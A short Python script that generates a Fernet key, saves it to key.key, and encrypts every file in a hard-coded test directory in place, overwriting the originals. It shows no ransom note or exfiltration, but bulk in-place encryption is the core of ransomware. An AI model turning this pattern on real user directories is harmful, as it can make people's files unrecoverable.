from cryptography.fernet import Fernet
import os

def generar_key():
	key = Fernet.generate_key()
	with open('key.key','wb') as key_file:
		key_file.write(key)

def cargar_key():
	return open('key.key', 'rb').read()

def encrypt(items,key):
	f = Fernet(key)
	for item in items:
		with open(item,'rb') as file:
			file_data = file.read()
		encrypt_data = f.encrypt(file_data)
		with open(item,'wb') as file:
			file.write(encrypt_data)

if __name__ == '__main__':
	
	path = '/home/roos/test'
	item = os.listdir(path)
	full_path = [path+'/'+items for items in item]

	generar_key()
	key = cargar_key()

	encrypt(full_path, key)	
 